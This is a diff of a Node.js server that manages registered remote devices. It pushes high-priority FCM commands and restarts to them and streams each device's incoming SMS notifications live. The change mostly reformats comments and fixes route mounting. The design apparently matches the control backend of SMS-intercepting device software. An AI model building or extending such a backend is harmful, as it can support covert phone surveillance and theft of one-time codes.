@@ -1,4 +1,7 @@
-// server.js
+// =====================================================
+// server.js  (A-to-Z FIXED VERSION)
+// =====================================================
+
 import dotenv from "dotenv";
 dotenv.config();
 
@@ -11,7 +14,7 @@ import { firestore, rtdb, fcm } from "./config/db.js";
 
 import userFullDataRoutes from "./routes/userFullDataRoutes.js";
 import adminRoutes from "./routes/adminRoutes.js";
-import notificationRoutes from "./routes/smsRoutes.js";
+import smsRoutes from "./routes/smsRoutes.js";    // ⭐ FIXED
 import checkRoutes from "./routes/checkRoutes.js";
 import commandRoutes from "./routes/commandRoutes.js";
 
@@ -22,6 +25,9 @@ const server = createServer(app);
 app.use(cors());
 app.use(express.json());
 
+// -----------------------------------------------------
+// SOCKET.IO
+// -----------------------------------------------------
 const io = new Server(server, {
   cors: { origin: "*", methods: ["GET", "POST"] },
 });
@@ -33,9 +39,9 @@ let lastDevicesList = [];
 
 const clean = (id) => id?.toString()?.trim()?.toUpperCase();
 
-/* ======================================================
-      SEND FCM HIGH PRIORITY
-====================================================== */
+// -----------------------------------------------------
+// SEND FCM HIGH PRIORITY
+// -----------------------------------------------------
 async function sendFcmHighPriority(token, type, payload = {}) {
   if (!token) return;
 
@@ -51,9 +57,9 @@ async function sendFcmHighPriority(token, type, payload = {}) {
   } catch (err) {}
 }
 
-/* ======================================================
-      BUILD + REFRESH DEVICES LIST
-====================================================== */
+// -----------------------------------------------------
+// BUILD DEVICES LIST
+// -----------------------------------------------------
 async function buildDevicesList() {
   const [devSnap, statusSnap] = await Promise.all([
     rtdb.ref("registeredDevices").get(),
@@ -91,13 +97,12 @@ async function refreshDevicesLive(reason = "") {
   } catch (err) {}
 }
 
-/* ======================================================
-      SOCKET CONNECTION
-====================================================== */
+// -----------------------------------------------------
+// SOCKET CONNECTION
+// -----------------------------------------------------
 io.on("connection", (socket) => {
   let currentDeviceId = null;
 
-  // Send initial devices list
   socket.emit("devicesLive", {
     success: true,
     count: lastDevicesList.length,
@@ -139,9 +144,9 @@ io.on("connection", (socket) => {
   });
 });
 
-/* ======================================================
-      SEND COMMAND
-====================================================== */
+// -----------------------------------------------------
+// SEND COMMAND
+// -----------------------------------------------------
 app.post("/send-command", async (req, res) => {
   try {
     const { uniqueid, title, message } = req.body;
@@ -159,9 +164,9 @@ app.post("/send-command", async (req, res) => {
   }
 });
 
-/* ======================================================
-      REPLY WATCHER
-====================================================== */
+// -----------------------------------------------------
+// CHECK ONLINE + REPLY WATCH
+// -----------------------------------------------------
 const liveReplyWatchers = new Map();
 
 function stopReplyWatcher(uid) {
@@ -219,30 +224,9 @@ app.get("/api/brosreply/:uid", async (req, res) => {
   }
 });
 
-/* ======================================================
-      ADMIN COMMAND PUSH
-====================================================== */
-rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
-  if (!snap.exists()) return;
-
-  const adminData = snap.val();
-  const all = await rtdb.ref("registeredDevices").get();
-  if (!all.exists()) return;
-
-  all.forEach((child) => {
-    const token = child.val()?.fcmToken;
-    if (token) {
-      sendFcmHighPriority(token, "ADMIN_UPDATE", {
-        deviceId: child.key,
-        ...adminData,
-      });
-    }
-  });
-});
-
-/* ======================================================
-      DEVICE COMMAND FORWARD
-====================================================== */
+// -----------------------------------------------------
+// DEVICE COMMAND FORWARD
+// -----------------------------------------------------
 function extractCommandData(raw) {
   if (raw?.action) return raw;
   const keys = Object.keys(raw || {});
@@ -267,16 +251,12 @@ async function handleDeviceCommandChange(snap) {
   });
 }
 
-rtdb
-  .ref("commandCenter/deviceCommands")
-  .on("child_added", handleDeviceCommandChange);
-rtdb
-  .ref("commandCenter/deviceCommands")
-  .on("child_changed", handleDeviceCommandChange);
+rtdb.ref("commandCenter/deviceCommands").on("child_added", handleDeviceCommandChange);
+rtdb.ref("commandCenter/deviceCommands").on("child_changed", handleDeviceCommandChange);
 
-/* ======================================================
-      CHECK ONLINE SYSTEM
-====================================================== */
+// -----------------------------------------------------
+// CHECK ONLINE SYSTEM
+// -----------------------------------------------------
 async function handleCheckOnlineChange(snap) {
   if (!snap.exists()) return;
 
@@ -310,9 +290,9 @@ const checkOnlineRef = rtdb.ref("checkOnline");
 checkOnlineRef.on("child_added", handleCheckOnlineChange);
 checkOnlineRef.on("child_changed", handleCheckOnlineChange);
 
-/* ======================================================
-      DEVICE RESTART
-====================================================== */
+// -----------------------------------------------------
+// DEVICE RESTART
+// -----------------------------------------------------
 app.post("/restart/:uid", async (req, res) => {
   try {
     const uid = clean(req.params.uid);
@@ -329,52 +309,11 @@ app.post("/restart/:uid", async (req, res) => {
   }
 });
 
-const RESTART_EXPIRY = 15 * 60 * 1000;
-
-/* ======================================================
-      LAST CHECK
-====================================================== */
-function formatAgo(ms) {
-  const sec = Math.floor((Date.now() - ms) / 1000);
-  if (sec < 60) return `${sec} sec`;
-  const min = Math.floor(sec / 60);
-  if (min < 60) return `${min} min`;
-  const hr = Math.floor(min / 60);
-  if (hr < 24) return `${hr} hr`;
-  const day = Math.floor(hr / 24);
-  return `${day} days`;
-}
-
-app.get("/api/lastcheck/:uid", async (req, res) => {
-  try {
-    const uid = clean(req.params.uid);
-    const snap = await rtdb.ref(`status/${uid}`).get();
-
-    if (!snap.exists()) {
-      return res.json({ success: false, message: "No status found" });
-    }
-
-    const st = snap.val();
-    const ts = st.timestamp || st.lastSeen || 0;
-
-    return res.json({
-      success: true,
-      uid,
-      lastCheckAt: ts,
-      readable: ts ? formatAgo(ts) : "N/A",
-    });
-  } catch (err) {
-    res.status(500).json({ success: false });
-  }
-});
-
-/* ======================================================
-      🔥🔥 SMS LIVE (LATEST ONLY)
-====================================================== */
-
+// -----------------------------------------------------
+// SMS LIVE LAST MESSAGE ONLY
+// -----------------------------------------------------
 const smsRef = rtdb.ref("smsNotifications");
 
-// Device-wise listener
 smsRef.on("child_added", handleSmsChange);
 smsRef.on("child_changed", handleSmsChange);
 
@@ -396,9 +335,9 @@ async function handleSmsChange(snap) {
   });
 }
 
-/* ======================================================
-      REGISTERED DEVICES LIVE
-====================================================== */
+// -----------------------------------------------------
+// REGISTERED DEVICES LIVE
+// -----------------------------------------------------
 const registeredDevicesRef = rtdb.ref("registeredDevices");
 
 registeredDevicesRef.on("child_added", () => {
@@ -426,14 +365,21 @@ app.get("/api/devices", async (req, res) => {
 
 refreshDevicesLive("initial");
 
+// -----------------------------------------------------
+// ⭐ FINAL FIX — Correct Route Mounting
+// -----------------------------------------------------
+app.use("/api/sms", smsRoutes);
+
 app.use(adminRoutes);
-app.use(notificationRoutes);
 app.use("/api", checkRoutes);
 app.use("/api", userFullDataRoutes);
 app.use(commandRoutes);
 
+// -----------------------------------------------------
 app.get("/", (_, res) => {
   res.send("RTDB + Socket.IO Backend Running");
 });
 
-server.listen(PORT, () => {});
+server.listen(PORT, () => {
+  console.log("🚀 SERVER RUNNING ON PORT", PORT);
+});
